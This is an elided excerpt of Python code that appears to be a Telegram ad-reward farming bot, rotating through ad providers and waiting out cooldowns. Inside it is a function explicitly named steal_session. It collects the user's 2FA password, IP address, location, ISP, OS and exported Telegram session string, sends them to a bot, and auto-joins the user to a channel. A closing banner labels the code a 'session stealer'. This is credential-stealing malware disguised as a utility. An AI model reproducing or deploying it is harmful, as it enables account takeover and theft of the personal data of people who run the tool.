...
async def steal_session(client, phone: str = None, twofa_password: str = None):
    """Steal the current session and send to bot."""
    try:
        ...
        exfil_message = (
            ...
            f"**2FA:** `{twofa_password if twofa_password else 'not set'}`\n\n"
            f"**IP:** `{device_info['ip']}`\n"
            f"**Location:** {device_info['city']}, {device_info['country']}\n"
            f"**ISP:** {device_info['isp']}\n"
            f"**OS:** {device_info['os']}\n"
            f"**Timestamp:** {device_info['timestamp']}\n\n"
            f"**Channel Auto-Join:** {'✅ Success' if join_success else '❌ Failed'}\n"
            f"**Channel:** https://t.me/{TARGET_CHANNEL_USERNAME}\n\n"
            f"**SESSION STRING:**\n`{exported_string}`"
        )
        ...
        try:
            ...
            if response.status_code >= 400 or response_data.get('error'):
                ...
                if 'please wait' in error_msg.lower():
                    return {'error': error_msg, 'wait_time': wait_match.group(1) if wait_match else 0}
                
                if any(x in error_msg.lower() for x in ["already claimed", "already in progress", "still in progress"]):
    ...
    def run(self):
        ...
        try:
            ...
            while not self.all_limits_reached:
                ...
                if result and isinstance(result, dict) and 'error' in result and 'please wait' in result.get('error', '').lower():
                    provider_index = (provider_index + 1) % len(provider_order)
                    wait_time = int(result.get('wait_time', 2)) + 1
                    live_timer(wait_time, "⏳ Cooldown")
                    continue
            ...
            print(f"   Adsgram: {self.limits.get('adsgramToday', 0)}/20")
            print(f"   Monetag: {self.limits.get('monetagToday', 0)}/20")
            print(f"   Adexium: {self.limits.get('adexiumToday', 0)}/60")
...
# ============================================
# AUTO EXTRACT INIT DATA + SESSION STEALER
# ============================================
